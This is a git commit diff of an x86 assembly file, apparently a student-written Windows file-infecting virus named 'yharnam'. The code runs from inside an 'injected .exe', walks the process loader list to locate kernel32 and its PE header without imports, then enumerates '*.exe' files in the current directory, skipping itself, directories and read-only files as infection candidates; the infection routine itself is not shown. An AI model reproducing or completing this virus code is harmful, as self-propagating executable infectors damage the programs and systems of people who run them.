5edf4559d3e61cd28a2ff87dbe9021317af915cb
Alexandre Paillier <alexandre.paillier@epitech.eu>
2017-02-28 20:39:07 +0100

    Now really gets the base address of kernel32 and its pe header, added a structure in the header file for managing the stack.

--- yharnam.asm
+++ yharnam.asm
@@ -25,14 +25,6 @@ option casemap:none
 data:
 	fileFilter          BYTE ".\*.exe",0
 	returnAddr          DWORD 000000000h
-	stackSize           DWORD ((sizeof BYTE * MAX_PATH * 2) + \
-							  sizeof WIN32_FIND_DATA + \
-							  sizeof HANDLE)
-	; offsets to the stack pointer
-	currentExe          DWORD 0
-	targetName          DWORD (sizeof BYTE * MAX_PATH)
-	fileStruct          DWORD (sizeof BYTE * MAX_PATH * 2)
-	fileSearchHandle    DWORD (sizeof BYTE * MAX_PATH * 2 + sizeof WIN32_FIND_DATA)
 
 start:
 	call _getAddr_ ; get the injected .exe's environment instruction pointer
@@ -85,22 +77,25 @@ loop_find_kernel32_continue:
 	mov edx, (LIST_ENTRY PTR [edx]).Flink
 	jmp loop_find_kernel32
 loop_find_kernel32_end:
-	; ->DllBase / get kernel32 base address
-	mov edx, (LDR_DATA_TABLE_ENTRY PTR [edx]).DllBase
-	
+	; ->DllBase, for some reason, does not hold the base address
+	; instead ->Reserved2[0] does
+	mov edx, [edx + (cStruct.LDR_DATA_TABLE_ENTRY.Reserved2 - cStruct.LDR_DATA_TABLE_ENTRY) + (sizeof PVOID * 0)]
+	; get PE header (base address + offset from the DOS header)
+	add edx, [edx + 03Ch]
+
 	pop ebx
 	; allocate space on the stack
-	sub esp, [ebx + (stackSize - data)]
+	sub esp, sizeof STACK_STORAGE
 
 	mov edx, esp
 	push MAX_PATH
-	add edx, [ebx + (currentExe - data)]
+	add edx, (cStruct.STACK_STORAGE.currentExe - cStruct.STACK_STORAGE)
 	push edx
 	push NULL
 	call GetModuleFileName ; get current .exe full file path
 
 	mov edx, esp
-	add edx, [ebx + (fileStruct - data)]
+	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
 	push edx
 	mov edx, ebx
 	add edx, (fileFilter - data)
@@ -111,24 +106,24 @@ loop_find_kernel32_end:
 	je loop_find_file_end
 
 	mov edx, esp
-	add edx, [ebx + (fileSearchHandle - data)]
+	add edx, (cStruct.STACK_STORAGE.searchHandle - cStruct.STACK_STORAGE)
 	mov [edx], eax
 loop_find_file:
 	; check file and put it on the stack if needed
 	mov eax, esp ; save stack "base" address
 	push NULL
 	mov edx, eax
-	add edx, [ebx + (targetName - data)]
+	add edx, (cStruct.STACK_STORAGE.targetName - cStruct.STACK_STORAGE)
 	push edx
 	push MAX_PATH
 	mov edx, eax
-	add edx, [ebx + (fileStruct - data)]
+	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
 	add edx, (cStruct.WIN32_FIND_DATA.cFileName - cStruct.WIN32_FIND_DATA)
 	push edx
 	call GetFullPathName ; get absolute file path
 	
 	mov edx, esp ; check if it's a directory
-	add edx, [ebx + (fileStruct - data)]
+	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
 	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
 	and edx, FILE_ATTRIBUTE_DIRECTORY
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
@@ -136,17 +131,17 @@ loop_find_file:
 
 	mov eax, esp
 	mov edx, eax
-	add edx, [ebx + (targetName - data)]
+	add edx, (cStruct.STACK_STORAGE.targetName - cStruct.STACK_STORAGE)
 	push edx
 	mov edx, eax
-	add edx, [ebx + (currentExe - data)]
+	add edx, (cStruct.STACK_STORAGE.currentExe - cStruct.STACK_STORAGE)
 	push edx
 	call lstrcmp ; check if this is the program
 	cmp eax, 0
 	je loop_find_file_continue
 
 	mov edx, esp ; check if it's a read-only file
-	add edx, [ebx + (fileStruct - data)]
+	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
 	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
 	and edx, FILE_ATTRIBUTE_READONLY
 	cmp edx, FILE_ATTRIBUTE_READONLY
@@ -160,10 +155,10 @@ loop_find_file:
 loop_find_file_continue:
 	mov eax, esp
 	mov edx, eax
-	add edx, [ebx + (fileStruct - data)]
+	add edx, (cStruct.STACK_STORAGE.fileStruct - cStruct.STACK_STORAGE)
 	push edx
 	mov edx, eax
-	add edx, [ebx + (fileSearchHandle - data)]
+	add edx, (cStruct.STACK_STORAGE.searchHandle - cStruct.STACK_STORAGE)
 	push [edx]
 	call FindNextFile
 	cmp eax, TRUE
